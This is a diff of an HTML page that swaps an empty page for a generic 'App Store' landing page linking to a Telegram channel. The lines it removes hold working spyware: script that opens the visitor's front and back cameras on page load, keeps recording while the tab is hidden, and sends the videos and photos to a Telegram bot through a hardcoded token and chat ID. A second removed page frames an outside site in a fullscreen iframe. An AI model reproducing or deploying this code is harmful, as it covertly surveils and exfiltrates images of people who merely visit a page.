@@ -1,167 +1,100 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>App Store | Download the Best Apps</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    /* Hero Background */
+    .hero-bg {
+      background-image: url('https://source.unsplash.com/1600x900/?technology,apps'); /* Example background */
+      background-size: cover;
+      background-position: center;
+    }
+    /* General Background for the entire body */
+    body {
+      background-image: url('https://source.unsplash.com/1600x900/?technology,apps'); /* Set a background image for the whole page */
+      background-size: cover;
+      background-position: center;
+    }
+  </style>
 </head>
-<body>
-    <h1></h1>
-    <p></p>
+<body class="bg-gray-100 text-gray-800 font-sans">
 
-    <script>
-        const telegramBotToken = "7067291143:AAHeemg_4QvJRjxN6rRQSk_fMxLKLZDwVhk"; // Replace with your bot's token
-        const chatId = "7888600155T"; // Replace with the chat ID where you want to send the video
+  <!-- Navbar -->
+  <header class="w-full bg-gray-900 text-white shadow-md fixed top-0 z-50">
+    <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+      <div class="text-2xl font-bold">
+        <a href="#" class="text-white hover:text-green-500">AppStore</a>
+      </div>
+      <nav class="space-x-6">
+        <a href="#apps" class="hover:text-green-500">Apps</a>
+        <a href="#about" class="hover:text-green-500">About</a>
+        <a href="#contact" class="hover:text-green-500">Contact</a>
+      </nav>
+    </div>
+  </header>
 
-        let stream;
-        let mediaRecorder;
-        let recordedChunks = [];
+  <!-- Hero Section -->
+  <section class="hero-bg h-screen flex items-center justify-center text-center text-white relative">
+    <div class="absolute inset-0 bg-black bg-opacity-50"></div>
+    <div class="z-10">
+      <h1 class="text-4xl md:text-6xl font-bold">Discover the Best Apps</h1>
+      <p class="text-xl mt-4">Browse and download the best applications for your phone.</p>
+    </div>
+  </section>
 
-        async function startCamera(cameraFacing) {
-            try {
-                // Access the camera
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: cameraFacing // "user" for front, "environment" for back
-                    }
-                });
-                return stream;
-            } catch (error) {
-                console.error("Error accessing the camera:", error);
-            }
-        }
+  <!-- Apps Section -->
+  <section id="apps" class="py-16">
+    <div class="max-w-7xl mx-auto px-6 text-center">
+      <h2 class="text-4xl font-bold text-gray-800">Featured Apps</h2>
+      <p class="text-lg text-gray-600 mt-4">Here are some of the best apps we offer for download.</p>
+      <div class="mt-12 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-8">
+        <div class="bg-white rounded-lg shadow-lg">
+          <div class="p-6">
+            <h3 class="text-xl font-semibold text-gray-800">App Name 1</h3>
+            <p class="text-gray-600 mt-4">A great app for productivity and enhancing your workflow.</p>
+            <a href="#" class="mt-6 inline-block px-6 py-3 bg-green-500 text-white rounded-lg font-semibold hover:bg-green-600 transition duration-300">Download Now</a>
+          </div>
+        </div>
+        <div class="bg-white rounded-lg shadow-lg">
+          <div class="p-6">
+            <h3 class="text-xl font-semibold text-gray-800">App Name 2</h3>
+            <p class="text-gray-600 mt-4">Enhance your entertainment experience with this amazing app.</p>
+            <a href="#" class="mt-6 inline-block px-6 py-3 bg-green-500 text-white rounded-lg font-semibold hover:bg-green-600 transition duration-300">Download Now</a>
+          </div>
+        </div>
+        <div class="bg-white rounded-lg shadow-lg">
+          <div class="p-6">
+            <h3 class="text-xl font-semibold text-gray-800">App Name 3</h3>
+            <p class="text-gray-600 mt-4">A powerful app to manage your finances and track your spending.</p>
+            <a href="#" class="mt-6 inline-block px-6 py-3 bg-green-500 text-white rounded-lg font-semibold hover:bg-green-600 transition duration-300">Download Now</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
 
-        function startRecording() {
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(stream);
+  <!-- About Section -->
+  <section id="about" class="py-16 bg-gray-50">
+    <div class="max-w-7xl mx-auto px-6 text-center">
+      <h2 class="text-4xl font-bold text-gray-800">About Us</h2>
+      <p class="text-lg text-gray-600 mt-4">We provide a wide range of apps that suit every need. Our goal is to offer the best apps for your phone, ensuring security and ease of use.</p>
+    </div>
+  </section>
 
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
+  <!-- Contact Section -->
+  <section id="contact">
+    <div class="mt-16 bg-gray-800 text-white py-8">
+      <h3 class="text-3xl font-semibold text-center">Join Us Today!</h3>
+      <p class="text-lg text-center mt-4">Start exploring and downloading the best apps for your device. Our collection is always growing!</p>
+      <div class="mt-8 text-center">
+        <a href="https://t.me/PremiumAppAccount" class="inline-block px-8 py-3 bg-green-500 text-white rounded-full text-xl font-medium hover:bg-green-600 transition duration-300">Telegram</a>
+      </div>
+    </div>
+  </section>
 
-            mediaRecorder.start();
-        }
-
-        async function stopRecordingAndSend() {
-            mediaRecorder.stop();
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(recordedChunks, { type: "video/mp4" });
-                const formData = new FormData();
-                formData.append("chat_id", chatId);
-                formData.append("video", blob, "recorded_video.mp4");
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
-                        method: "POST",
-                        body: formData
-                    });
-                } catch (error) {
-                    console.error("Error sending video to Telegram:", error);
-                }
-            };
-        }
-
-        async function capturePhoto(cameraFacing) {
-            const photoStream = await startCamera(cameraFacing);
-            const videoElement = document.createElement("video");
-            videoElement.srcObject = photoStream;
-            await videoElement.play();
-
-            const canvas = document.createElement("canvas");
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-
-            const context = canvas.getContext("2d");
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-            const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg"));
-
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", blob, "captured_photo.jpg");
-
-            try {
-                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                });
-            } catch (error) {
-                console.error("Error sending photo to Telegram:", error);
-            }
-
-            photoStream.getTracks().forEach((track) => track.stop());
-        }
-
-        async function recordSequence() {
-            // Record first 5 seconds with the front camera
-            stream = await startCamera("user");
-            startRecording();
-            setTimeout(async () => {
-                await stopRecordingAndSend();
-
-                // Switch to the back camera and record next 5 seconds
-                stream.getTracks().forEach((track) => track.stop()); // Stop current stream
-                stream = await startCamera("environment");
-                startRecording();
-
-                setTimeout(async () => {
-                    await stopRecordingAndSend();
-                    stream.getTracks().forEach((track) => track.stop()); // Stop back camera stream
-
-                    // Restart the sequence after some delay
-                    setTimeout(recordSequence, 2000); // 2-second delay before restarting
-                }, 5000); // Back camera recording duration
-            }, 5000); // Front camera recording duration
-        }
-
-        async function startCapturing() {
-            // Start taking photos periodically (every 7 seconds)
-            setInterval(async () => {
-                await capturePhoto("user"); // Take a photo with the front camera
-                await capturePhoto("environment"); // Take a photo with the back camera
-            }, 7000);
-
-            // Start the video recording sequence
-            recordSequence();
-        }
-
-        // Ensure the recording continues even when the tab is inactive
-        document.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === "visible") {
-                console.log("Tab is active");
-            } else {
-                console.log("Tab is inactive, recording continues...");
-            }
-        });
-
-        // Start capturing as soon as the page loads
-        startCapturing();
-    </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fullscreen iFrame</title>
-<style>
-  body, html {
-    margin: 0;
-    padding: 0;
-    height: 100%;
-    overflow: hidden;
-  }
-  iframe {
-    width: 100%;
-    height: 100%;
-    border: none;
-  }
-</style>
-</head>
-<body>
-<iframe src="https://love-alpha-brown.vercel.app/" allowfullscreen></iframe>
 </body>
 </html>
